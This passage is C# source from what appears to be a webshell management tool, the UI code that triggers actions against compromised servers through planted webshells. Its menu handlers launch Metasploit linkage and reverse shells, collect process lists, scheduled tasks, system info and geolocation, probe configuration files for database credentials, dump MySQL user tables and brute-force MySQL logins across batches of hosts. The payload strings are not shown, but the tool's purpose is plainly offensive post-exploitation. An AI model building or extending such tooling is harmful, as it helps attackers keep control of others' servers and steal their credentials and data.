                return ClientSetting.InfoProbeItems[this.sgType] + ":无结果";

            string rawResult = m0.Groups[1].Value;
            if (this.sgType == SGType.LocationInfo)
                return LocationResult(rawResult);

            if (ClientSetting.table.ContainsKey(this.sgType)) //进程 计划任务 系统信息……
                return ClientSetting.WriteResult(rawResult, taskUrl, ClientSetting.table[this.sgType]);
         
            return rawResult;
        }
       
        private string LocationResult(string rawResult)
        {
            Regex r = new Regex("formatted_address\":\"(.+),\"business");
            int index = new Random().Next(0, ClientSetting.BDLocationAK.Count - 1);
            string bdURL = string.Format(ClientSetting.BDLocationAPI, ClientSetting.BDLocationAK[index], rawResult);
            string jsonResult = ST.EncodeUTF8(WebClientEx.Post(bdURL, string.Empty, 8000, Proxy));
            Match m = r.Match(jsonResult);
            return m.Success ? rawResult + ":" + m.Groups[1].Value : string.Empty;
        }

        
        // msf部分
        private void MSFMenu_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            DialogResult dialogResult = new MSFSet(LV.SelectedItems[0].Tag as WebShellTaskConfig, Proxy).ShowDialog();
            if (dialogResult.Equals(DialogResult.OK))
                this.infoConfigStatus.Text = DateTime.Now + ": MSF联动已发起";
        }

        private void ReverseShellMenu_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            DialogResult dialogResult = new ReverseShellSet(LV.SelectedItems[0].Tag as WebShellTaskConfig, Proxy).ShowDialog();
            if (dialogResult.Equals(DialogResult.OK))
                this.infoConfigStatus.Text = DateTime.Now + ": 反弹Shell已发起";
        }


        private void LV_MouseClick(object sender, MouseEventArgs e)
        {
            this.LV.ContextMenuStrip = this.contextMenuStrip;

            if (e.Button != MouseButtons.Right || e.Clicks != 1 || LV.SelectedItems.Count == 0)
                return;

            ListViewItem item = LV.SelectedItems[0];
            ListViewItem.ListViewSubItem subItem = item.GetSubItemAt(e.X, e.Y);

            if (subItem == null || item.SubItems.IndexOf(subItem) != 7)
                return;

            if (!subItem.Text.StartsWith(Path.Combine(Global.UserWorkspacePath, "后信息采集")))
                return;

            this.LV.ContextMenuStrip = this.contextMenuStrip1;

        }
        private void OpenFileMenuItem_Click(object sender, EventArgs e)
        {
            ProcessUtil.ProcessOpen(CurrentFilePath());
        }

        private void OpenDirMenuItem_Click(object sender, EventArgs e)
        {
            FileUtil.ExploreDirectory(CurrentFilePath());
        }

        private void CopyDirMenuItem_Click(object sender, EventArgs e)
        {
            FileUtil.TryClipboardSetText(CurrentFilePath());
        }
        private string CurrentFilePath()
        {
            return LV.SelectedItems[0].SubItems[7].Text;
        }
        #endregion

        private void UnlockButton_Click(object sender, EventArgs e)
        {
            if (new FunctionUnlockForm().ShowDialog() == DialogResult.OK)
                FuctionUnlock();
        }

        private void 查找ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            finder.FindHit();
        }

        private void LV_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            LVComparer c = LV.ListViewItemSorter as LVComparer;
            c.col = e.Column;
            c.asce = !c.asce;
            using(WaitCursor)
            using (new LayoutGuarder(LV))
            {
                LV.Sort();
                RefreshTasks(false); // 回写任务, 速度慢, 将来要优化
                RefreshBackColor();  // 重新布局
            }
                
        }

        private void 地理定位ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            DoCurrentItemTask();
        }

        private void 定时任务ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            DoCurrentItemTask();
        }

        private void 进程列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            DoCurrentItemTask();
        }

        private void 系统信息ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            DoCurrentItemTask();
        }
        // 超级ping部分
        private void SuperPingMenuItem_Click(object sender, EventArgs e)
        {
            CreatePingPayload();
            DoCurrentItemTask();
        }     
        private void AllSuperPing_Click(object sender, EventArgs e)
        {
            CreatePingPayload();
            BatchInfoColletion(false);
        }
        private void AlivSuperPing_Click(object sender, EventArgs e)
        {
            CreatePingPayload();
            BatchInfoColletion(true);
        }
        private void CreatePingPayload()
        {
            this.sgType = SGType.SuperPing;
            SuperPingSet sps = new SuperPingSet();
            if (sps.ShowDialog() != DialogResult.OK)
                return;
            string payload = string.Format(ClientSetting.SuperPingPayload, "{0}", ST.EncodeBase64(sps.Domain));
            ClientSetting.PayloadDict[SGType.SuperPing] = payload;
        }


        private void 配置文件探针ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            int timeout = ConfigPayloadOk();
            if (timeout == 0) 
                return;
            SelectedInfoColletion(timeout);
        }
        private int ConfigPayloadOk()
        {
            MysqlProbeSet mps = new MysqlProbeSet();
            if (mps.ShowDialog() != DialogResult.OK)
                return 0;

            int ps = mps.ProbeStrategy;
            string files = mps.SearchFiles.Trim();
            string fields = mps.SearchFields.Trim();

            this.sgType = SGType.MysqlProbe;
            string payload = string.Format(ClientSetting.MysqlProbePayload,
                "{0}",
                ps,
                ST.EncodeBase64(files),
                ST.EncodeBase64(fields));

            ClientSetting.PayloadDict[SGType.MysqlProbe] = payload;
            return mps.TimeoutSeconds;
        }
        private void UserMYD探针ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            if (!UserMYDPayloadOK())
                return;
            SelectedInfoColletion();
        }
        private bool UserMYDPayloadOK()
        {
            bool buildOK = true;             
            UserMYDProbeSet utp = new UserMYDProbeSet();
            if (utp.ShowDialog() != DialogResult.OK)
                return !buildOK;
            this.sgType = SGType.UserTable;
            string payload = string.Format(ClientSetting.UserTablePayload,
                                         "{0}", utp.DBUser, utp.DBPassword);

            ClientSetting.PayloadDict[SGType.UserTable] = payload;
            return buildOK;
        }

        private void 全部验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ResetCheckCache(ResetTypeEnum.继续上次);
            DoCheckAliveContinue(false);
        }

        private void 境外验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ResetCheckCache(ResetTypeEnum.继续上次_境外);
            DoCheckAliveContinue(true);
        }

        private void MB_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            BatchInfoColletion(false);
        }

        private void MB_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            BatchInfoColletion(true);
        }

        private void MB_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            DoCurrentItemTask();
        }

        private void 配置文件探针_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int timeout = ConfigPayloadOk();
            if (timeout == 0)
                return;
            BatchInfoColletion(false, timeout);
        }

        private void 配置文件探针_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int timeout = ConfigPayloadOk();
            if (timeout == 0)
                return;
            BatchInfoColletion(true, timeout);
        }

        private void 配置文件探针_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            int timeout = ConfigPayloadOk();
            if (timeout == 0)
                return;
            SelectedInfoColletion(timeout);
        }

        private void UserMYD探针_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!UserMYDPayloadOK())
                return;
            BatchInfoColletion(false);
        }

        private void UserMYD探针_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!UserMYDPayloadOK())
                return;
            BatchInfoColletion(true);
        }

        private void UserMYD探针_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            if (!UserMYDPayloadOK())
                return;
            SelectedInfoColletion();
        }

        private void MB_设置ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new MysqlBlastingSet().ShowDialog();
        }
    }
}
